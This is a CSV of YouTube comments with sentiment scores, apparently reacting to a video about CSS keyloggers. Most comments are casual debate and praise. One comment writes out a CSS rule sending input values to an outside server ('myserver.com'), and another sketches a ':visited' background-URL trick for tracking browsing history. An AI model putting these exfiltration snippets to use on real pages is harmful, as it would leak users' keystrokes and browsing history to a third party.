,sentiment,wordCount
Is (mutation)mXss still a thing,0.0,8
"It doesn't even work unless your js is actively changing the value attribute on every input.
Some other guy also reported that each character would only get registered once.",0.5719,31
"It doesn't work as a keylogger. Just try it. Open jsFiddle, paste the code, look at the network connections. It just doesn't work.",0.0,29
It is not per se as it is not autonomous,0.0,10
"It is surely possible by doing that. I just recall that being something that came up in the past, since I distinctly remember being frustrated I couldn't get the colour of a link for some reason. It was probably some ugly hack I was trying to do years ago.",-0.5859,53
"It's not relevant, if you use only external CSS and same origin politics in CSP header. The browser will not run inline CSS as it will not run inline JS either, if you set the right politics. You can check it in browser debugging window.
This is relevant only if you do not know how to set the correct policies.",0.0,66
"It's only a real threat if only a select few know about it, which is why you don't see the bad guys spreading it around. Promoting awareness helps the good guys test for, minimize, and in some cases even block these attacks.",0.1655,47
Its NOT hack,0.0,3
Keep it up dude! Great videos.,0.6588,8
"Lee Roy I know, that was my original point. It's impossible to get the colour of a link in JS.",0.3182,23
Nice english many likes from me.,0.6808,7
Nice overview and breakdown.  And thank you for highlighting the earlier research.  :),0.8074,15
"Not quite sure how this CSS keylogger would be advantegeous over an JS Keylogger.
1. It's a lot more work, and a lot less reliable as you, for example, cant detect backspaces.
2. It will generate A LOT more requests in a browser, thus making it a lot easier for console users to detect something fishy going on (Aside of the large amount of requests, just loading this huge list of CSS rules will impact the site loading performance as well, which surely also will be noticed.
3. Are there really people who disable JavaScript? And if so, what percentage are we looking at, especially depending on the website, since most require JS to work if you dont want the website to lose most of its functionality.",0.8441,145
"One could argue that hosting CSS files on a ""untrusted"" CDN is not a big deal, compared to hosting JS on a untrusted CDN.  If one hijacks the CDN, they could implement this, no?",-0.5994,41
Or just use JavaScript?,0.0,5
Proof?,0.0,2
Same way you get malicious JS or HTML somewhere. With some kind of injection or so.,0.0,18
Second! Sick video. Have never heard about it tho,-0.5562,11
Security by obscurity. The best kind of security ;),0.872,10
Setting the background of a an input selector isn't keylogging btw,0.0,11
Sir please make video on section overflow.,0.3182,8
So handsome,0.5413,2
"Sorry, I was replying to the CSS guy, wasn't paying attention...",-0.0772,14
Stephen Lynx watch the video properly reeee,0.0,7
Stop using fancy frameworks and write JavaScript from scratch in Emacs. This is what I do.,-0.296,18
SwordQuake2 They teach how how to make bombs in chemistry my dude,0.0,13
SwordQuake2 then you've never studied economics,0.0,7
"TOMYSSHADOW Need a separate class for each competitor, but you get the idea.",0.0,15
TOMYSSHADOW No problem. Just do it in css. A.competitor.visited{background url...,-0.5994,15
Tatu Saalasti i mean he was probably caught up with his thought process and didnt wanna lose his train of thought,0.3089,21
Teachers don't tell you how to steal people's information,-0.4939,9
"That reminds me a lot about how they made it so in JS you can't detect the colour of a link, since websites could put hidden links to their competitors and check if they were purple in order to see if the user visited their competitor's site...",0.0,49
"This applies to me too i think there are some chrome vulnerabilities in changing startup site, search engine, etc.. definitly didn't download a thing",-0.1531,27
"This can be used to deanonymize users of tor. It also is why you should use the tell browser and why it tells you not to change the browser windows dimensions.
I'm not sure why you are saying it  can't as it definitely can. Maybe you are misunderstanding what they mean about Deanonymization in this context is just being able to distinguish two users from each other in a somewhat persistent way.",-0.7202,76
Turing completeness is not sufficient to implement metasploit. Turning completeness does not imply side effects. Metasploit needs specific side effects.,0.0,23
UnboxModz learn css in this video?,0.0,7
"Very old, its funny 😄 if you don't know About it HHH",0.4877,13
VoidMoth you made the claim but ok (no need to be rude),0.4215,14
Weird that the re-research guy didn't simply Google- search for CSS- keylogger programs before starting his little project.,-0.1779,21
What you describe sounds like year 2005 or so. This shouldn’t happen anymore today ;),0.5267,18
When this video came up i first seen CSS and thought it was Counter Strike Source.... Then i saw it was your channel and i felt like a idiot... hahahahah,0.25,32
"Why don't they do it like this:

input {
  background: url(""http://myserver.com/"" attr(value)) // Add the thing to combine these here :)
}",0.6705,33
Why?,0.0,2
"Wouldn't the keylogger make no sense, since it's counting that some JS will sync the `value` property. Why not use JS instead?",-0.296,27
"Yeah yeah, jQuery is fantastic, isn't it? :P

I know that all the devs these days are dwelling in their dependencies, but that doesn't mean that your counter app needs to have 50kb in libraries when you can just make that with the DOM API.

Libraries like React and Vue are great at reducing developing time and cost, but that doesn't mean that they need to be in every website",0.9154,76
"Yeah, ""awesome"". GJ spreading threats around",0.4824,10
"Yeah, aweseome! You would arrest teachers for teaching wouldn't you? Knowledge can always be used for the good and bad.",-0.2714,24
You Sir are wise :) thanks for reminding this,0.8402,9
You can find a making off video on my channel ;),0.2263,11
You can't do that without js,0.0,6
You compared that to the discovery of a planet in the habitable zone? Com'mon... -.-,0.0,19
"You know... I'm entirely new to the topic... and I really don't know anything about what this channel is all about, so.... where do I start? ^^ Any suggestions as to where I can start learning about programming and hacking overall? :3",0.5661,50
"You should do my schools ctf. its at ctf.tamu.edu

Even though the competition ends today I believe the challenges will still be up. It would be very interesting to see your take on them.",0.5095,37
Your voice sounds like Codeinstein,0.3612,5
Zioshi yes,0.4019,2
ash boon I mean is it really someone would have to have access to the HTML on the server or some way of injecting it to all of the clients.,0.0,31
attr() isn't supported outside of the content property,-0.2411,10
because you wouldn't need megabytes of css to log the input,0.0,11
bist du deutscher,0.0,3
creative is hack born to dare,0.4404,6
css Lulzzz.css,0.0,2
fake,-0.4767,1
finally something I can understand...,0.0,6
first!,0.0,2
"glaub nicht, dass er österreicher ist. er studiert & arbeitet in berlin...",0.0,15
"good channel but in almoust every video half of time is spent to judging other people behaviour, useless information and very annoying..",-0.4118,24
his train of thought was still boarding at the station.  lmao,0.5994,12
"i dont understand anything about computer science, but there is something enjoyable watching your videos lol",0.8201,17
i watching this video and i dont understand all about it 😓😖,0.0,13
"if i recall correctly, firefox discards most css properties/values for :visited, so that shouldn't(?) work",-0.25,23
"in that case the thing is that images can come from different servers without causing trouble with the Cross Origin Resource Security, you wouldn't be able to send the data across to your server using javascript directly ...",0.5659,39
lol,0.4215,1
no problem ;),-0.4588,3
"off topic, but its good practice to try to pronounce every word you can't pronounce straight away or look it up so you can improve your english. loved the video, very nice quality.",0.9558,37
"sorry, i should say almoust every video i watched, rubber duck for example, but great channel keep it up! i'm trying to learn how to make anticheat for my games :)",0.8955,35
thats actually quite cool,0.3804,4
"the moment selecting stuff via n letter becomes possible, is the moment a ton of sites will have keyloggers appear out of thin air",0.0,25
what is?,0.0,3
"yeah, I said in the video that it's more of a ""thought experiment"", because it's really rare",0.296,21
youre a big boy now so I guess you can use these new things called internet search engines you should try them,0.0,22
"Не понятно, че делать то с этим. Как загружать жертве, только через плугин браузера?",0.0,18
